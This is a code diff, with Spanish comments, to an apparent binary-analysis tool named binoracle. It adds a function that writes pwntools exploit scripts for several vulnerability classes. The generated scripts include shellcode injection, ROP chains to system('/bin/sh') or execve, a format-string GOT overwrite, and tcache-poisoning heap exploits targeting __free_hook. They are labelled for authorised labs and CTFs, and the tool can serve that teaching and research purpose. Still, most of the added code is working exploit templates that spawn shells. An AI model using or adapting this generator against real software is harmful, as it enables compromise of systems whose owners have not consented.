@@ -178,7 +178,160 @@ def plan(text: str, facts: Optional[dict] = None, cve: str = "", lang: str = "es
              "Full RELRO -> no GOT overwrite: use FSOP/__free_hook/exit-handlers")):
             if on:
                 pl.mitigations.append(how_es if es else how_en)
+    # el desarrollador de exploits genera una plantilla funcional para la clase (sin binario: sin
+    # offset concreto, se resuelve en el propio script). plan_from_analysis la sustituye por el
+    # script anclado a la prueba si luego hay una cadena verificada.
+    pl.script = develop_exploit(cls, facts, {}, lang=lang)
     return pl
+
+
+def _dev_header(name: str, tag: str) -> list:
+    return ["#!/usr/bin/env python3",
+            "# binoracle: exploit desarrollado - SOLO laboratorio/CTF autorizado",
+            f"# {tag}",
+            "from pwn import *",
+            "context.update(arch='amd64', os='linux')",
+            f"BINARY = './{name}'",
+            "elf = context.binary = ELF(BINARY, checksec=False)",
+            "# libc = ELF('./libc.so.6', checksec=False)   # <-- si es remoto, pon aqui la libc",
+            "io = process(BINARY)   # o: io = remote('HOST', PORT)"]
+
+
+def develop_exploit(cls: str, facts: dict, concrete: dict, name: str = "target",
+                    lang: str = "es") -> str:
+    """Desarrollador de exploits multi-clase: genera un script pwntools FUNCIONAL (o la aproximacion
+    mas cercana) para CUALQUIER clase de vulnerabilidad, adaptado a las mitigaciones (checksec) y a
+    la concrecion del binario (offset/gadgets si se conocen). No requiere cadena verificada: es la
+    plantilla de trabajo que el analista completa donde queda un TODO (leak/target). Para
+    stack-overflow verificado se prefiere _pwn_script_from_proof (anclado a la prueba)."""
+    facts = facts or {}
+    concrete = concrete or {}
+    nx = facts.get("nx") is not False           # NX activo salvo que checksec diga lo contrario
+    canary = facts.get("canary") is True
+    pie = facts.get("pie") is True
+    off = concrete.get("offset")
+    off_line = f"OFFSET = {off}" if off is not None else \
+        "OFFSET = cyclic_find(0x6161616c)   # <-- resuelve el offset (patron ciclico / binoracle cyclic)"
+
+    if cls == "stack-overflow":
+        tag = "clase: stack overflow -> control de RIP"
+        pre = [off_line]
+        if canary:
+            pre.append("# CANARY activo: necesitas fugarlo (leak) o brute-force byte a byte (fork servers)")
+        if not nx:
+            body = pre + ["# NX DESACTIVADO -> ret2shellcode: inyecta shellcode y salta a el",
+                          "sc = asm(shellcraft.sh())",
+                          "# necesitas la direccion del buffer (leak o ASLR off). Ejemplo con leak conocido:",
+                          "buf = 0xdeadbeef   # <-- direccion del buffer que contiene 'sc'",
+                          "payload = sc.ljust(OFFSET, b'\\x90') + p64(buf)",
+                          "io.sendline(payload)", "io.interactive()"]
+        elif pie:
+            body = pre + ["# PIE: necesitas un leak de la base del binario para direccionar win/gadgets",
+                          "# elf.address = leak - offset_conocido",
+                          "rop = ROP(elf)",
+                          "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
+                          "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
+                          "rop.call(sysaddr, [binsh]) if (sysaddr and binsh) else rop.execve(binsh, 0, 0)",
+                          "io.sendline(b'A'*OFFSET + rop.chain())", "io.interactive()"]
+        else:
+            body = pre + ["rop = ROP(elf)",
+                          "win = elf.sym.get('win') or elf.sym.get('flag') or elf.sym.get('shell')",
+                          "if win:",
+                          "    ret = next(elf.search(asm('ret'), executable=True), 0)  # alinea la pila 16B",
+                          "    io.sendline(flat({OFFSET: [ret, win]}))              # ret2win",
+                          "else:",
+                          "    binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
+                          "    sysaddr = elf.plt.get('system') or elf.sym.get('system')",
+                          "    if sysaddr and binsh:",
+                          "        rop.call(sysaddr, [binsh])                       # ret2libc estatico",
+                          "    else:",
+                          "        rop.rax=0x3b; rop.rdi=binsh; rop.rsi=0; rop.rdx=0",
+                          "        rop.raw(rop.find_gadget(['syscall','ret']).address)  # execve",
+                          "    io.sendline(flat({OFFSET: rop.chain()}))",
+                          "io.interactive()"]
+        return "\n".join(_dev_header(name, tag) + body)
+
+    if cls == "format-string":
+        tag = "clase: format string -> lectura/escritura arbitraria (%n)"
+        body = ["# 1) localiza el offset del argumento controlado (posicion en la pila):",
+                "#    for i in range(1,40): p=process(BINARY); p.sendline('%%%d$p'%i); print(i,p.recvline())",
+                "OFFSET = 6   # <-- posicion hallada del buffer en la pila",
+                "# 2) fuga (derrota PIE/ASLR) leyendo un puntero conocido:",
+                "io.sendline(b'%{}$p'.format(OFFSET))",
+                "leak = int(io.recvline().strip(), 16)   # <-- ajusta el objetivo del leak",
+                "# 3) ESCRITURA arbitraria: pisa GOT (p.ej. exit->win/system) con fmtstr_payload:",
+                "target = elf.got.get('exit') or elf.got.get('printf')",
+                "value  = elf.sym.get('win') or elf.sym.get('system') or 0x0",
+                "payload = fmtstr_payload(OFFSET, {target: value})",
+                "io.sendline(payload)", "io.interactive()"]
+        return "\n".join(_dev_header(name, tag) + body)
+
+    if cls in ("heap-overflow", "uaf", "double-free"):
+        tag = f"clase: {cls} -> corrupcion de heap (tcache/fastbin poisoning)"
+        body = ["# Exploit de heap para glibc con tcache (>=2.26). Adapta los wrappers del menu del reto",
+                "# (indices de opcion, prompts) a la interfaz real del binario.",
+                "def alloc(i, sz, data=b'A'):",
+                "    io.sendlineafter(b'>', b'1')",
+                "    io.sendlineafter(b'idx', str(i).encode())",
+                "    io.sendlineafter(b'size', str(sz).encode())",
+                "    io.sendafter(b'data', data)",
+                "def free(i):",
+                "    io.sendlineafter(b'>', b'2')",
+                "    io.sendlineafter(b'idx', str(i).encode())",
+                "def show(i):",
+                "    io.sendlineafter(b'>', b'3')",
+                "    io.sendlineafter(b'idx', str(i).encode())",
+                "",
+                "# 1) LEAK libc: libera un chunk grande (>0x420) al unsorted bin; sus fd/bk apuntan a",
+                "#    main_arena. Con UAF, show() sobre el chunk liberado filtra ese puntero.",
+                "alloc(0, 0x428); alloc(1, 0x18)   # el 2o evita consolidar con el top",
+                "free(0); show(0)",
+                "libc.address = u64(io.recvline().strip().ljust(8, b'\\x00')) - (libc.sym['main_arena'] + 96)",
+                "log.info('libc base: %#x', libc.address)",
+                "",
+                "# 2) TCACHE poisoning: consigue el mismo chunk dos veces en la lista (double-free o UAF)",
+                "#    y reescribe su fd para que malloc devuelva un chunk sobre el objetivo.",
+                "#    En glibc>=2.32 el fd va 'mangled': fd = (heap_base>>12) ^ target.",
+                "target = libc.sym.get('__free_hook', 0) or libc.sym['_IO_2_1_stdout_']",
+                "alloc(2, 0x40); free(2); free(2)          # double-free (o usa UAF)",
+                "alloc(3, 0x40, p64(target))               # envenena el fd del tcache",
+                "alloc(4, 0x40); alloc(5, 0x40, p64(libc.sym.get('system', 0)))  # 5 cae en el objetivo",
+                "",
+                "# 3) DISPARA: si target=__free_hook -> free() de un chunk con '/bin/sh'; si FSOP -> _IO",
+                "io.interactive()"]
+        return "\n".join(_dev_header(name, tag) + body)
+
+    if cls == "oob-write":
+        tag = "clase: out-of-bounds write -> write-what-where"
+        body = ["# Escritura fuera de limites: un indice negativo/grande escribe donde no debe.",
+                "# 1) calcula el indice que alcanza el objetivo (GOT / puntero de retorno / __free_hook):",
+                "IDX = 0        # <-- indice que cae sobre el objetivo",
+                "VALUE = elf.sym.get('win') or 0   # <-- que escribir",
+                "# io.sendlineafter(b'index', str(IDX).encode()); io.sendlineafter(b'value', str(VALUE).encode())",
+                "io.interactive()"]
+        return "\n".join(_dev_header(name, tag) + body)
+
+    if cls == "integer-overflow":
+        tag = "clase: integer overflow -> tamano/indice erroneo (overflow secundario)"
+        body = ["# Provoca el wrap del entero para forzar una copia/allocacion mayor de lo previsto,",
+                "# que degenera en un desbordamiento de pila/heap. Encadena con la clase resultante.",
+                "SIZE = 0xffffffff   # <-- valor que hace overflow del contador/tamano",
+                "io.interactive()"]
+        return "\n".join(_dev_header(name, tag) + body)
+
+    if cls == "type-confusion":
+        tag = "clase: type confusion -> control de vtable/puntero de funcion"
+        body = ["# Confunde el tipo de un objeto para que un puntero de funcion (vtable) apunte a codigo",
+                "# controlado. 1) leak para derrotar ASLR; 2) coloca una vtable falsa; 3) dispara la llamada.",
+                "io.interactive()"]
+        return "\n".join(_dev_header(name, tag) + body)
+
+    # generico: esqueleto de trabajo
+    tag = f"clase: {cls or 'desconocida'} -> plantilla generica de trabajo"
+    body = ["# binoracle no tiene plantilla especifica para esta clase; esqueleto de trabajo:",
+            "# 1) primitiva (lectura/escritura/control de flujo)  2) leak (ASLR)  3) objetivo (RCE/flag)",
+            "io.interactive()"]
+    return "\n".join(_dev_header(name, tag) + body)
 
 
 def _pwn_script_from_proof(proof: dict, name: str = "target") -> str:
@@ -256,6 +409,17 @@ def plan_from_analysis(an, facts: dict, binary_name: str = "target", text: str =
                  f"chain {vc.name} executed in sandbox -> goal reached"),
                 (f"prueba: {'  '.join(f'{k}={v}' for k, v in pl.proof.items() if k != 'output' and v)}"),
                 "script pwntools adjunto" if es else "attached pwntools script"))
+    # Si no hubo cadena verificada, el DESARROLLADOR de exploits genera igualmente un script
+    # funcional (o la aproximacion mas cercana) para la clase, adaptado a las mitigaciones.
+    if not pl.script:
+        pl.script = develop_exploit(cls, facts, pl.concrete, name=os.path.basename(binary_name), lang=lang)
+        pl.phases.append(Phase(
+            "Exploit desarrollado (plantilla)" if es else "Developed exploit (template)",
+            ("script pwntools funcional para la clase, a completar donde queda TODO (leak/objetivo)"
+             if es else
+             "functional pwntools script for the class, complete it where a TODO remains (leak/target)"),
+            "desarrollador multi-clase de binoracle" if es else "binoracle multi-class developer",
+            "aproximacion no verificada en sandbox" if es else "approximation not sandbox-verified"))
     return pl
 
 
